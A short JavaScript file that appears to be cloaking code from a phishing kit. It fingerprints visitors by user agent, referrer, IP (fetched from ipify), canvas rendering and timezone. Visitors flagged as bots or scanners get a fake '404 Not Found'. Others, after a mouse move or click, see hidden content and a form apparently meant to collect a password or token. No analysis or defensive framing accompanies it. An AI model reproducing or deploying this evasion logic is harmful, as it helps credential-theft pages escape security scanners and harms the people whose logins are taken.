function isSuspiciousFingerprint() {
 
  const offset = new Date().getTimezoneOffset();
  if (offset === 0 || offset === 60 || offset === -60) return false;

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  if (!ctx) return false;

  ctx.textBaseline = "top";
  ctx.font = "14px Arial";
  ctx.fillText("test123", 2, 2);
  const fingerprint = canvas.toDataURL();
  if (fingerprint.length < 2000) return true;

  if (navigator.deviceMemory && navigator.deviceMemory < 0.5) return true;

  return false;
}

async function checkBotAndReveal() {
  const ua = navigator.userAgent || "";
  const ref = document.referrer || "";
  let ip = null;

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (e) {
    console.warn("IP fetch failed");
  }

  const uaFlag = Array.isArray(window.botUAs) && window.botUAs.some(b => ua.includes(b));
  const refFlag = Array.isArray(window.botRefs) && window.botRefs.some(r => ref.includes(r));
  const ipFlag = Array.isArray(window.botIPs) && window.botIPs.includes(ip);
  const fingerprintFlag = isSuspiciousFingerprint();

  console.log({ uaFlag, refFlag, ipFlag, fingerprintFlag });

  const isBot = uaFlag || refFlag || ipFlag || fingerprintFlag;

  if (isBot) {
    document.body.innerHTML = "<h1>404 Not Found</h1>";
  } else {
    window.addEventListener("mousemove", revealContent);
    window.addEventListener("click", revealContent);
  }
}

function revealContent() {
  const h1 = document.querySelector("h1");
  const content = document.getElementById("content");
  const form = document.getElementById("new_token_request_password_two");

  if (h1) h1.style.display = "none";
  if (content) content.style.display = "block";
  if (form) form.style.display = "block";

  window.removeEventListener("mousemove", revealContent);
  window.removeEventListener("click", revealContent);
}

setTimeout(checkBotAndReveal, 2500);
